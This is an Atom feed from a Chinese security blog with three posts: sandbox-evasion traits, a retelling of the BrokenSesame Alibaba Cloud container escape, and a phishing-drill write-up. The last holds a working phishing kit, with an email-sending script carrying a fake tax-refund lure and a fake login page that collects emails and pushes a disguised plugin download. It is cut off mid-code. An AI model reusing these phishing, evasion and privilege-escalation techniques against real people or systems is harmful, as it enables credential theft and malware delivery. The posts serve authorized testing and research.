<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>😊#</title>
  
  
  <link href="https://jkme.github.io/atom.xml" rel="self"/>
  
  <link href="https://jkme.github.io/"/>
  <updated>2023-04-23T08:17:06.021Z</updated>
  <id>https://jkme.github.io/</id>
  
  <author>
    <name>JKme</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>沙盒环境信息收集</title>
    <link href="https://jkme.github.io/2023/04/23/sandbox-info-collect.html"/>
    <id>https://jkme.github.io/2023/04/23/sandbox-info-collect.html</id>
    <published>2023-04-22T16:00:00.000Z</published>
    <updated>2023-04-23T08:17:06.021Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>收集沙盒的环境</p><h2 id="看图说话"><a href="#看图说话" class="headerlink" title="看图说话"></a>看图说话</h2><p><img src="/2023/04/23/sandbox-info-collect/1.png"></p><p>从上面的图就能看出来很多特征:</p><ul><li>比如中国的时区是-8，沙盒多不是，当然某步除外</li><li>第三条是某步的沙盒，进程里面存在<code>AcrylicService.exe</code>，实际使用的时候可以做一次for循环hash判断，避免程序中直接出现关键词</li><li>大部分沙盒会重新二次修改为随机文件名，也可以从这个点下手</li><li>内存一般小于4G</li><li>部分虚拟机存在Cucoo的特征，比如某步，具体可以看<a href="https://github.com/CheckPointSW/InviZzzible">CheckPointSW/InviZzzible</a></li><li>也可以用主机名作为判断条件</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://mp.weixin.qq.com/s/CY9RnIAn-la573BWrkufNQ">沙箱环境检测和绕过</a></li><li><a href="https://github.com/CheckPointSW/InviZzzible">CheckPointSW/InviZzzible</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;目的&quot;&gt;&lt;a href=&quot;#目的&quot; class=&quot;headerlink&quot; title=&quot;目的&quot;&gt;&lt;/a&gt;目的&lt;/h2&gt;&lt;p&gt;收集沙盒的环境&lt;/p&gt;
&lt;h2 id=&quot;看图说话&quot;&gt;&lt;a href=&quot;#看图说话&quot; class=&quot;headerlink&quot; title=&quot;看图说话&quot;&gt;&lt;/a&gt;看图说话&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2023/04/23/sandbox-info-collect/1.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;从上面的图就能看出来很多特征:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;比如中国的时区是-8，沙盒多不是，当然某步除外&lt;/li&gt;
&lt;li&gt;第三条是某步的沙盒，进程里面存在&lt;code&gt;AcrylicService.exe&lt;/code&gt;，实际使用的时候可以做一次for循环hash判断，避免程序中直接出现关键词&lt;/li&gt;
&lt;li&gt;大部分沙盒会重新二次修改为随机文件名，也可以从这个点下手&lt;/li&gt;
&lt;li&gt;内存一般小于4G&lt;/li&gt;
&lt;li&gt;部分虚拟机存在Cucoo的特征，比如某步，具体可以看&lt;a href=&quot;https://github.com/CheckPointSW/InviZzzible&quot;&gt;CheckPointSW/InviZzzible&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;也可以用主机名作为判断条件&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;参考链接&quot;&gt;&lt;a href=&quot;#参考链接&quot; class=&quot;headerlink&quot; title=&quot;参考链接&quot;&gt;&lt;/a&gt;参考链接&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/CY9RnIAn-la573BWrkufNQ&quot;&gt;沙箱环境检测和绕过&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/CheckPointSW/InviZzzible&quot;&gt;CheckPointSW/InviZzzible&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>BrokenSesame-阿里云数据库远程命令执行</title>
    <link href="https://jkme.github.io/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html"/>
    <id>https://jkme.github.io/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE.html</id>
    <published>2023-04-19T16:00:00.000Z</published>
    <updated>2023-04-20T05:36:15.384Z</updated>
    
    <content type="html"><![CDATA[<ul><li>原文：<a href="https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r">brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r</a></li></ul><h2 id="AnalyticDB-for-PostgreSQL"><a href="#AnalyticDB-for-PostgreSQL" class="headerlink" title="AnalyticDB for PostgreSQL"></a>AnalyticDB for PostgreSQL</h2><h3 id="容器提权"><a href="#容器提权" class="headerlink" title="容器提权"></a>容器提权</h3><p>首先发现了一个ROOT定时任务，该定时任务每分钟执行一次二进制文件<code>/usr/bin/tsar</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$: <span class="token function">ls</span> -lah /etc/cron.d/tsar -rw-r--r-- <span class="token number">1</span> root root <span class="token number">99</span> Apr <span class="token number">19</span>  <span class="token number">2021</span> /etc/cron.d/tsar $: <span class="token function">cat</span> /etc/cron.d/tsar <span class="token comment"># cron tsar collect once per minute </span><span class="token assign-left variable">MAILTO</span><span class="token operator">=</span><span class="token string">""</span> * * * * * root /usr/bin/tsar --cron <span class="token operator">></span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>ldd</code>发现从自定义路径加载共享库，其中的一个路径<code>/u01</code>对于当前用户<code>adbpgadmin</code>是可写的。<br><img src="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/1.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$: <span class="token function">ls</span> -alh /u01/adbpg/lib/libgcc_s.so.1 -rwxr-xr-x <span class="token number">1</span> adbpgadmin adbpgadmin 102K Oct <span class="token number">27</span> <span class="token number">12</span>:22 /u01/adbpg/lib/libgcc_s.so.1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果用自己的共享库覆盖这个文件，那么下次就会以root权限执行自定义的代码，攻击流程：</p><ul><li>编译一个共享库，功能是将<code>/bin/bash</code>复制到<code>/bin/dash</code>，并添加SUID权限。</li><li>把编译好的共享库使用<a href="https://github.com/NixOS/patchelf">PatchELF</a>，添加到<code>libgcc_s.so.1</code>，这样当<code>libgcc_s.so.1</code>被加载的时候，恶意代码会被执行。</li><li>覆盖<code>libgcc_s.so.1</code>库</li><li>等待定时任务执行</li></ul><p>最终获取Root权限:<br><img src="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/2.png"></p><h3 id="逃逸到K8s-Node"><a href="#逃逸到K8s-Node" class="headerlink" title="逃逸到K8s Node"></a>逃逸到K8s Node</h3><p>根据作者对云服务的测试经验，一般UI界面的操作会导致托管环境创建容器或者进程，从而扩大攻击面。比如在阿里云门户中某些操作（启用SSL加密），可以观察到多个SCP和SSH进程的创建。<br><img src="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/3.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Command lines of the spawned processes</span><span class="token function">su</span> - adbpgadmin -c <span class="token function">scp</span> /home/adbpgadmin/xxx_ssl_files/* *REDACTED*:/home/adbpgadmin/data/master/seg-1/ /usr/bin/ssh -x -oForwardAgent<span class="token operator">=</span>no -oPermitLocalCommand<span class="token operator">=</span>no -oClearAllForwardings<span class="token operator">=</span>yes -- *REDACTED* <span class="token function">scp</span> -d -t /home/adbpgadmin/data/master/seg-1/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作者发现这些生成的进程包含容器中不存在的路径，推测是在容器共享PID中不同容器中生成的，为了验证者推测，作者写了一个POC，当生成SCP进程的时候，使用<code>/proc/&#123;pid&#125;/root/</code>访问该进程下的文件系统：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># The Python script we used to access the second container filesystem</span><span class="token keyword">import</span> psutil <span class="token keyword">import</span> os listed <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>     <span class="token keyword">for</span> proc <span class="token keyword">in</span> psutil<span class="token punctuation">.</span>process_iter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">try</span><span class="token punctuation">:</span>             processName <span class="token operator">=</span> proc<span class="token punctuation">.</span>name<span class="token punctuation">(</span><span class="token punctuation">)</span>             processID <span class="token operator">=</span> proc<span class="token punctuation">.</span>pid             cmdLine <span class="token operator">=</span> proc<span class="token punctuation">.</span>cmdline<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token keyword">if</span> processID <span class="token keyword">not</span> <span class="token keyword">in</span> listed <span class="token keyword">and</span> processName <span class="token operator">==</span> <span class="token string">'scp'</span><span class="token punctuation">:</span>                 os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls -alh /proc/&#123;&#125;/root/'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>processID<span class="token punctuation">)</span><span class="token punctuation">)</span>                 listed<span class="token punctuation">.</span>add<span class="token punctuation">(</span>processID<span class="token punctuation">)</span>         <span class="token keyword">except</span> <span class="token punctuation">(</span>psutil<span class="token punctuation">.</span>NoSuchProcess<span class="token punctuation">,</span> psutil<span class="token punctuation">.</span>AccessDenied<span class="token punctuation">,</span> psutil<span class="token punctuation">.</span>ZombieProcess<span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">pass</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在阿里云平台门户启用SSL操作之后，观察脚本的输出，可以确认尽管两个容器不同，但它们的主目录(/home/adbpgadmin)是相同的挂载。</p><p>在验证了上面想法之后，作者挑选使用SSH来获取第二个容器的权限，修改本地ssh配置文件: <code>/home/adbpgadmin/.ssh/config</code></p><p><img src="/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/4.png"></p><p>这样当ssh命令执行的时候，就会触发执行<code>LocalCommand</code>指定的脚本，此时是以root权限在第二个容器执行的，并在第二个容器发现了<code>docker.sock</code></p><p>由于第二个容器是临时生成的，作者利用创建了一个持久化的容器，但是具体技术细节没有说明。</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;原文：&lt;a href=&quot;https://www.wiz.io/blog/brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r&quot;&gt;brokensesame-accidental-write-permissions-to-private-registry-allowed-potential-r&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;AnalyticDB-for-PostgreSQL&quot;&gt;&lt;a href=&quot;#AnalyticDB-for-PostgreSQL&quot; class=&quot;headerlink&quot; title=&quot;AnalyticDB for PostgreSQL&quot;&gt;&lt;/a&gt;AnalyticDB for PostgreSQL&lt;/h2&gt;&lt;h3 id=&quot;容器提权&quot;&gt;&lt;a href=&quot;#容器提权&quot; class=&quot;headerlink&quot; title=&quot;容器提权&quot;&gt;&lt;/a&gt;容器提权&lt;/h3&gt;&lt;p&gt;首先发现了一个ROOT定时任务，该定时任务每分钟执行一次二进制文件&lt;code&gt;/usr/bin/tsar&lt;/code&gt;:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$: &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -lah /etc/cron.d/tsar 
-rw-r--r-- &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; root root &lt;span class=&quot;token number&quot;&gt;99&lt;/span&gt; Apr &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2021&lt;/span&gt; /etc/cron.d/tsar 

$: &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; /etc/cron.d/tsar 

&lt;span class=&quot;token comment&quot;&gt;# cron tsar collect once per minute &lt;/span&gt;
&lt;span class=&quot;token assign-left variable&quot;&gt;MAILTO&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt; 
* * * * * root /usr/bin/tsar --cron &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; /dev/null &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;&amp;amp;1&lt;/span&gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用&lt;code&gt;ldd&lt;/code&gt;发现从自定义路径加载共享库，其中的一个路径&lt;code&gt;/u01&lt;/code&gt;对于当前用户&lt;code&gt;adbpgadmin&lt;/code&gt;是可写的。&lt;br&gt;&lt;img src=&quot;/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/1.png&quot;&gt;&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-bash&quot; data-language=&quot;bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$: &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -alh /u01/adbpg/lib/libgcc_s.so.1 
-rwxr-xr-x &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; adbpgadmin adbpgadmin 102K Oct &lt;span class=&quot;token number&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;:22 /u01/adbpg/lib/libgcc_s.so.1 &lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果用自己的共享库覆盖这个文件，那么下次就会以root权限执行自定义的代码，攻击流程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;编译一个共享库，功能是将&lt;code&gt;/bin/bash&lt;/code&gt;复制到&lt;code&gt;/bin/dash&lt;/code&gt;，并添加SUID权限。&lt;/li&gt;
&lt;li&gt;把编译好的共享库使用&lt;a href=&quot;https://github.com/NixOS/patchelf&quot;&gt;PatchELF&lt;/a&gt;，添加到&lt;code&gt;libgcc_s.so.1&lt;/code&gt;，这样当&lt;code&gt;libgcc_s.so.1&lt;/code&gt;被加载的时候，恶意代码会被执行。&lt;/li&gt;
&lt;li&gt;覆盖&lt;code&gt;libgcc_s.so.1&lt;/code&gt;库&lt;/li&gt;
&lt;li&gt;等待定时任务执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最终获取Root权限:&lt;br&gt;&lt;img src=&quot;/2023/04/20/BrokenSesame-Alibaba-Cloud-Database-Services-RCE/2.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次钓鱼演练和OS X下的渗透技巧</title>
    <link href="https://jkme.github.io/2023/03/27/pinfish-and-osx-pentest.html"/>
    <id>https://jkme.github.io/2023/03/27/pinfish-and-osx-pentest.html</id>
    <published>2023-03-26T16:00:00.000Z</published>
    <updated>2023-03-30T06:21:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>一年一度的钓鱼节，需要针对公司员工做一次钓鱼演练，前期准备工作如下:</p><ul><li>确定钓鱼的页面：图方便选了一个登录入口，用Chrome插件SingleFile右键一键保存</li><li>确定钓鱼的形式：引导用户输入公司邮箱，点击完成之后，弹出需要安装插件，根据UA决定是下载pkg还是exe。</li><li>确定钓鱼的效果：从三个数据维度来看最终效果<ul><li>钓鱼页面访问次数</li><li>输入公司邮箱的数量统计</li><li>收集运行了Exe和Pkg的用户</li></ul></li></ul><h2 id="钓鱼邮件的发送"><a href="#钓鱼邮件的发送" class="headerlink" title="钓鱼邮件的发送"></a>钓鱼邮件的发送</h2><p>有两种形式可以发送钓鱼邮件：</p><ol><li>使用相近域名</li><li>使用sendcloud</li></ol><h3 id="相近域名发送"><a href="#相近域名发送" class="headerlink" title="相近域名发送"></a>相近域名发送</h3><p>注册相近域名之后，可以根据这里的步骤绑定使用zoho的免费企业邮箱: <a href="https://zhuanlan.zhihu.com/p/341879374">2021年四款国内外免费企业邮箱及申请教程图解</a></p><h3 id="使用SendCloud"><a href="#使用SendCloud" class="headerlink" title="使用SendCloud"></a>使用SendCloud</h3><p>注册SendCloud之后，生成API Key，利用以下代码发送钓鱼邮件：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> jsonurl<span class="token operator">=</span><span class="token string">"http://api.sendcloud.net/apiv2/mail/send"</span>body <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    &lt;br>    各位同事:&lt;br>    &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;根据《关于延续实施全年一次性奖金等个人所得税优惠政策的公告》（财政部税务总局2023年第4号公告），全年一次性奖金单独计税优惠政策，执行期限延长至2023年4月14日。为确保广大职工充分享受该项税收优惠政策，2022年底税务总局对每一名职工的全年工薪收入和各类扣除情况进行了分析测算，按政策将大部分职工年底发放的部分绩效结算金额按全年一次性奖金优化计税。优化后，有78.2%的职工可节约税金。在2023年4月中旬申报期完成全年一次性奖金纳税申报后，后续会按程序将节约的税金发至职工账户上，申报操作流程，请据此跳转税务申报平台: &lt;a href='https://example.com/'>税务申报平台&lt;a>&lt;br>需要说明：经过对职工全年应缴税额和已扣税额对比，部分职工需要补税，补税的金额将在后续发放的绩效中扣除。相关政策职工可通过此链接&lt;a href='http://www.chinatax.gov.cn'>http://www.chinatax.gov.cn/&lt;/a>查看。"""</span>receives <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'john@victim.com'</span><span class="token punctuation">]</span><span class="token comment"># 您需要登录SendCloud创建API_USER，使用API_USER和API_KEY才可以进行邮件的发送。</span>params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"apiUser"</span><span class="token punctuation">:</span> <span class="token string">"&lt;Users>"</span><span class="token punctuation">,</span> \  <span class="token string">"apiKey"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;apikey>"</span><span class="token punctuation">,</span>\  <span class="token string">"from"</span> <span class="token punctuation">:</span> <span class="token string">"hr@example.com"</span><span class="token punctuation">,</span> \  <span class="token string">"fromName"</span> <span class="token punctuation">:</span> <span class="token string">"hr@example.com"</span><span class="token punctuation">,</span> \  <span class="token string">"to"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;helo@victim.com>"</span><span class="token punctuation">,</span> \  <span class="token string">"subject"</span> <span class="token punctuation">:</span> <span class="token string">"【重要】关于2023年个人所得税税收优化"</span><span class="token punctuation">,</span> \  <span class="token string">"html"</span><span class="token punctuation">:</span> body<span class="token punctuation">,</span> \<span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="钓鱼的页面"><a href="#钓鱼的页面" class="headerlink" title="钓鱼的页面"></a>钓鱼的页面</h2><p>对输入的信息进行后端提交，输入完成之后弹框提示用户下载插件，js代码如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>link href<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@4/bulma.css"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">isValidEmail</span><span class="token punctuation">(</span><span class="token parameter">email</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[a-zA-Z0-9_\.-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">isChinese</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[\u4E00-\u9FA5]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">login_submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> usernameInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> emailInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isChinese</span><span class="token punctuation">(</span>usernameInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Oops...'</span><span class="token punctuation">,</span>            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'请输入中文公司名称'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isValidEmail</span><span class="token punctuation">(</span>emailInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Oops...'</span><span class="token punctuation">,</span>            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'请输入正确的邮箱地址!'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isChinese</span><span class="token punctuation">(</span>usernameInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isValidEmail</span><span class="token punctuation">(</span>emailInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">const</span> corpname <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>                <span class="token keyword">const</span> email <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>                <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"corpname"</span><span class="token punctuation">,</span> corpname<span class="token punctuation">)</span><span class="token punctuation">;</span>                formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'/login'</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//Call a function when the state changes.</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>http<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> http<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                       <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Win'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'提交成功!'</span><span class="token punctuation">,</span>                            <span class="token literal-property property">showCloseButton</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                            <span class="token literal-property property">focusConfirm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                            <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token string">'晚些会向您发送邮件通知，请安装税务系统插件: &lt;a href="https://example.com/download/win">点击下载&lt;/a> '</span><span class="token punctuation">,</span>                            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'success'</span>                            <span class="token punctuation">&#125;</span>                            <span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Mac'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'提交成功!'</span><span class="token punctuation">,</span>                            <span class="token literal-property property">showCloseButton</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                            <span class="token literal-property 